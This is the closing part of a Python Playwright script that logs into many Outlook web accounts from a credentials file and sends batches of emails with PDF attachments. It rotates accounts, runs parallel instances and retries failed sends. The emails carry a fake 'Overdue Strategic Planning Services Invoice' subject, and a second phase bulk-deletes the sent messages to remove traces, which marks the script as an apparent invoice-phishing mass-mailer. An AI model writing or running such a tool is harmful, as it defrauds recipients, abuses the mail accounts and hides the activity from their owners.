                                    lambda: send_button.click(force=True),
                                    lambda: send_button.click(),
                                    lambda: send_button.evaluate("el => el.click()"),
                                    lambda: page.evaluate(f"document.querySelector('{selector}').click()")
                                ]
                                
                                for i, click_method in enumerate(click_methods):
                                    try:
                                        print(f"[>] Trying click method {i+1}...")
                                        click_method()
                                        page.wait_for_timeout(2000)
                                        
                                        if not page.locator("input[placeholder='Add a subject']").is_visible():
                                            print(f"[✓] Send successful with method {i+1}")
                                            send_clicked = True
                                            break
                                        else:
                                            print(f"[!] Method {i+1} failed, compose still open")
                                    except Exception as click_error:
                                        print(f"[!] Click method {i+1} error: {click_error}")
                                        continue
                                
                                if send_clicked:
                                    break
                                    
                        except Exception as e:
                            print(f"[!] Selector {selector} failed: {e}")
                            continue
                    
                    if not send_clicked:
                        print("[>] Button clicks failed, trying keyboard shortcut...")
                        try:
                            page.locator("div[role='textbox'][aria-label*='Message body']").click()
                            page.wait_for_timeout(500)
                            
                            page.keyboard.press("Control+Enter")
                            page.wait_for_timeout(3000)
                            
                            if not page.locator("input[placeholder='Add a subject']").is_visible():
                                print("[✓] Send successful with Ctrl+Enter")
                                send_clicked = True
                        except Exception as kb_error:
                            print(f"[!] Keyboard shortcut failed: {kb_error}")
                    
                    if not send_clicked:
                        print("[>] Trying last resort send methods...")
                        try:
                            all_send_elements = page.locator("text=Send")
                            count = all_send_elements.count()
                            print(f"[>] Found {count} elements with 'Send' text")
                            
                            for i in range(count):
                                try:
                                    element = all_send_elements.nth(i)
                                    if element.is_visible():
                                        print(f"[>] Trying Send element {i+1}...")
                                        element.click(force=True)
                                        page.wait_for_timeout(2000)
                                        
                                        if not page.locator("input[placeholder='Add a subject']").is_visible():
                                            print(f"[✓] Send successful with element {i+1}")
                                            send_clicked = True
                                            break
                                except Exception as e:
                                    continue
                        except Exception as e:
                            print(f"[!] Last resort method failed: {e}")
                    
                    if send_clicked:
                        page.wait_for_timeout(2000)
                        popup_result = handle_outlook_popups(page)
                        
                        if popup_result == "FILE_TYPE_ERROR":
                            print(f"[!] FAILED: Outlook rejected attachments for {recipient_data['email']}")
                            fail_count += 1
                            write_log(email, recipient_data, "FAILED", "File type rejected by Outlook")
                        elif popup_result == "NO_ATTACHMENTS_DETECTED":
                            print(f"[!] FAILED: No attachments detected for {recipient_data['email']}")
                            fail_count += 1
                            write_log(email, recipient_data, "FAILED", "No attachments detected")
                        else:
                            print(f"[✓] Email successfully sent to {recipient_data['email']}")
                            success_count += 1
                            emails_sent_successfully += 1
                            attachment_str = "; ".join(attachment_info) if attachment_info else "No attachments"
                            write_log(email, recipient_data, "SENT", attachment_str)
                    else:
                        print(f"[X] All send methods failed for {recipient_data['email']}")
                        fail_count += 1
                        write_log(email, recipient_data, "FAILED", "Unable to click Send button")
                    
                except Exception as e:
                    print(f"[X] Critical send error: {e}")
                    fail_count += 1
                    write_log(email, recipient_data, "FAILED", f"Critical send error: {e}")

                # Clean up PDF
                if pdf_path and Path(pdf_path).exists() and PDF_CLEANUP:
                    try:
                        Path(pdf_path).unlink()
                        print(f"[+] Cleaned up PDF")
                    except:
                        pass

                time.sleep(INTER_EMAIL_DELAY)

            except Exception as main_error:
                print(f"[X] Error processing {recipient_data['email']}: {main_error}")
                fail_count += 1
                write_log(email, recipient_data, "FAILED", f"Processing error: {main_error}")

        # PHASE 2: Bulk delete all sent emails
        if emails_sent_successfully > 0:
            print(f"\n[>] PHASE 2: Bulk deleting {emails_sent_successfully} sent emails...")
            
            time.sleep(5)
            
            search_pattern = "Overdue Strategic Planning Services Invoice INV-202500015711"
            
            deletion_rounds = search_and_bulk_delete_sent_emails(page, search_pattern)
            
            if deletion_rounds > 0:
                print(f"[✓] Bulk deletion completed in {deletion_rounds} rounds")
            else:
                print(f"[!] Bulk deletion failed or no emails found to delete")
        else:
            print(f"[>] No emails were sent successfully, skipping deletion phase")

        browser.close()
        return batch_success
        
    except Exception as e:
        print(f"[!] Critical error with account {email}: {e}")
        try:
            browser.close()
        except:
            pass
        return False

def run_single_instance():
    """Run single instance"""
    global success_count, fail_count, attempted
    
    print("="*60)
    print("🚀 EMAIL AUTOMATION SCRIPT")
    print("="*60)
    
    logins_path = os.environ.get('LOGINS_FILE', LOGINS_FILE)
    recipients_path = os.environ.get('RECIPIENTS_FILE', RECIPIENTS_FILE)
    
    logins = load_logins(logins_path)
    recipients = load_recipients(recipients_path)
    templates = load_templates()

    if not recipients or not logins or not templates:
        print("[!] Missing required files or data. Exiting.")
        return

    print(f"[+] Using {len(logins)} accounts and {len(recipients)} recipients")
    print(f"[+] Loaded {len(templates)} message templates")
    print(f"[+] PDF Generation: {'Enabled' if ENABLE_PDF_GENERATION else 'Disabled'}")
    print(f"[+] Attachments: {'Enabled' if ENABLE_ATTACHMENTS else 'Disabled'}")

    login_index = 0
    recipient_index = 0
    logins_updated = False
    failed_logins = set()

    with sync_playwright() as p:
        while recipient_index < len(recipients):
            if not logins:
                print("[!] No usable logins available. Cannot continue.")
                break
                
            email, password, sender_name = logins[login_index % len(logins)]
            
            if email in failed_logins:
                print(f"[!] Skipping previously failed login: {email}")
                login_index += 1
                if login_index >= len(logins) * 2: # Avoid infinite loop
                    print("[!] All available logins have failed.")
                    break
                continue
            
            if not session_exists(email):
                print(f"[>] Attempting login for: {email}")
                login_success, detected_name = login_and_save_session(email, password, p)
                
                if not login_success:
                    print(f"[!] Login failed for {email}, marking as failed and trying next account")
                    failed_logins.add(email)
                    login_index += 1
                    continue
                
                print(f"[✓] Login successful for: {email}")
                
                if detected_name and not sender_name:
                    logins[login_index % len(logins)][2] = detected_name
                    sender_name = detected_name
                    logins_updated = True

            if not sender_name:
                sender_name = email.split('@')[0].title()
                logins[login_index % len(logins)][2] = sender_name
                logins_updated = True

            end_index = min(recipient_index + EMAILS_PER_ACCOUNT, len(recipients))
            batch = recipients[recipient_index:end_index]
            
            print(f"\n{'='*50}")
            print(f"🔄 ACCOUNT: {email}")
            print(f"👤 SENDER: {sender_name}")
            print(f"📧 BATCH: {len(batch)} recipients")
            print(f"🚀 FAST MODE: {'ON' if FAST_MODE else 'OFF'}")
            print(f"{'='*50}")

            batch_start_time = time.time()
            
            batch_success = send_multiple_emails(email, batch, templates, sender_name, p)
            
            if not batch_success:
                print(f"[!] Account {email} failed during sending, marking as failed")
                failed_logins.add(email)
                # Don't advance recipients, just try next login
                login_index += 1
                continue
            
            batch_time = time.time() - batch_start_time
            emails_per_minute = (len(batch) / batch_time) * 60 if batch_time > 0 else 0
            print(f"[📊] Batch completed in {batch_time:.1f}s ({emails_per_minute:.1f} emails/min)")

            recipient_index += len(batch)
            login_index += 1

            if recipient_index < len(recipients):
                print(f"[+] Switching accounts...")
                time.sleep(1 if FAST_MODE else 2)

    if logins_updated and not ENABLE_MULTI_INSTANCE:
        update_logins_file(logins)

    # Note: Summary is printed in the main/launcher function
    
def retry_failed_sends():
    """Handles the process of retrying failed emails after the main run."""
    if not ENABLE_RETRY:
        print("\n[+] Retry feature is disabled. Skipping retry phase.")
        return

    if not Path(RETRY_FILE).exists() or Path(RETRY_FILE).stat().st_size == 0:
        print("\n[✓] No failed emails to retry.")
        return

    print("\n" + "="*80)
    print("🔁 RETRYING FAILED SENDS")
    print("="*80)

    # Load all available logins from the main file for random selection
    all_logins = load_logins(LOGINS_FILE)
    if not all_logins:
        print("[!] No logins available in the main logins.txt. Cannot retry.")
        return

    # Load recipients to be retried
    recipients_to_retry = load_recipients(RETRY_FILE)
    templates = load_templates()
    
    if not recipients_to_retry or not templates:
        print("[!] Missing templates or recipients for retry. Aborting.")
        return
        
    print(f"[+] Found {len(recipients_to_retry)} emails to retry.")
    
    retry_success_count = 0
    retry_fail_count = 0
    
    with sync_playwright() as p:
        for recipient_data in recipients_to_retry:
            print(f"\n--- Retrying for: {recipient_data['email']} ---")
            
            # Select a random login account for this retry attempt
            email, password, sender_name = random.choice(all_logins)
            
            if not sender_name:
                sender_name = email.split('@')[0].title()
                
            print(f"[>] Using random account: {email}")

            # login_and_save_session is not needed here as send_multiple_emails will handle it
            # We send one email at a time in the retry loop
            batch_success = send_multiple_emails(email, [recipient_data], templates, sender_name, p)
            
            if batch_success:
                print(f"[✓] RETRY SUCCESSFUL for {recipient_data['email']}")
                retry_success_count += 1
            else:
                print(f"[X] RETRY FAILED for {recipient_data['email']}")
                retry_fail_count += 1

    print("\n" + "="*80)
    print("🔁 RETRY PHASE SUMMARY")
    print("="*80)
    print(f"✅ Successful Retries: {retry_success_count}")
    print(f"❌ Failed Retries: {retry_fail_count}")
    print("="*80)
    
    # Clear the retry file after processing
    try:
        with open(RETRY_FILE, "w") as f:
            f.write("")
        print(f"[✓] Cleared the retry file: {RETRY_FILE}")
    except Exception as e:
        print(f"[!] Could not clear the retry file: {e}")

def main():
    """Main execution function"""
    if not ENABLE_MULTI_INSTANCE:
        run_single_instance()
        retry_failed_sends() # Run retry logic after single instance run
        
        # Final Summary for Single Instance
        print("\n" + "="*60)
        print("📋 FINAL SUMMARY")
        print("="*60)
        print(f"📧 Total Recipients Processed: {attempted}")
        print(f"✅ Successfully Sent (Initial Run): {success_count}")
        print(f"❌ Failed to Send (Initial Run): {fail_count}")
        if attempted > 0:
            print(f"📈 Success Rate: {(success_count/attempted*100):.1f}%")
        print(f"🚀 Performance Mode: {'FAST' if FAST_MODE else 'NORMAL'}")
        print("="*60)
        return
    
    # --- Multi-Instance Logic ---
    print("="*80)
    print("🚀 MULTI-INSTANCE EMAIL AUTOMATION LAUNCHER")
    print("="*80)
    
    # Clear retry file at the start of a new run
    if Path(RETRY_FILE).exists():
        with open(RETRY_FILE, "w") as f:
            f.write("") # Clear the file
    
    temp_dir = Path("tdata")
    temp_dir.mkdir(exist_ok=True)
    print(f"📁 Created temporary directory: {temp_dir}")
    
    with open(LOG_FILE, "w") as f:
        f.write(f"# Multi-Instance Email Automation Log - Started {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    instance_data = split_data_in_memory()
    if not instance_data:
        print("❌ Failed to load data")
        return
    
    print(f"\n🚀 Launching {NUM_INSTANCES} instances...")
    
    for data in instance_data:
        instance_num = data['instance_num']
        
        logins_file = temp_dir / f"logins{instance_num}.txt"
        input_file = temp_dir / f"input{instance_num}.txt"
        
        with open(logins_file, "w") as f:
            f.write("\n".join(data['logins']))
        
        with open(input_file, "w", encoding='utf-8') as f:
            f.write("\n".join(data['recipients']))
        
        print(f"📄 Created temp files for Instance {instance_num}: {logins_file.name}, {input_file.name}")
    
    processes = []
    for data in instance_data:
        instance_num = data['instance_num']
        
        env = os.environ.copy()
        env['INSTANCE_NUM'] = str(instance_num)
        env['LOGINS_FILE'] = str(temp_dir / f'logins{instance_num}.txt')
        env['RECIPIENTS_FILE'] = str(temp_dir / f'input{instance_num}.txt')
        
        cmd = [sys.executable, __file__, '--instance', str(instance_num)]
        process = subprocess.Popen(cmd, env=env)
        processes.append(process)
        
        print(f"✅ Instance {instance_num} started (PID: {process.pid})")
        
        if instance_num < NUM_INSTANCES:
            print(f"⏳ Waiting {STAGGER_DELAY}s before next instance...")
            time.sleep(STAGGER_DELAY)
    
    print(f"\n📊 All {NUM_INSTANCES} instances launched! Starting monitor...")
    
    monitor_thread = threading.Thread(target=monitor_instances, daemon=True)
    monitor_thread.start()
    
    try:
        for process in processes:
            process.wait()
        
        time.sleep(5) # Give monitor time to show final report
        
        # After all instances are done, run the retry logic
        retry_failed_sends()
        
        cleanup_temp_files()
        
        print("\n🎉 All instances completed and cleaned up!")
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Stopping all instances...")
        for process in processes:
            try:
                process.terminate()
                process.wait(timeout=10)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        cleanup_temp_files()
        print("🛑 All instances stopped and cleaned up.")

def run_instance():
    """Run a single instance when called with --instance flag"""
    instance_num = int(os.environ.get('INSTANCE_NUM', '1'))
    
    global LOGINS_FILE, RECIPIENTS_FILE
    LOGINS_FILE = os.environ.get('LOGINS_FILE', LOGINS_FILE)
    RECIPIENTS_FILE = os.environ.get('RECIPIENTS_FILE', RECIPIENTS_FILE)
    
    print(f"="*60)
    print(f"🤖 EMAIL AUTOMATION INSTANCE {instance_num}")
    print(f"="*60)
    print(f"📂 Using logins: {LOGINS_FILE}")
    print(f"📂 Using recipients: {RECIPIENTS_FILE}")
    print(f"📂 Logging to: {LOG_FILE}")
    print(f"🖥️ Headless mode: {HEADLESS}")
    print(f"⚡ Fast mode: {FAST_MODE}")
    print(f"🔁 Retry on fail: {'Enabled' if ENABLE_RETRY else 'Disabled'}")
    print(f"="*60)
    
    run_single_instance()

if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == '--instance':
        run_instance()
    else:
        main()
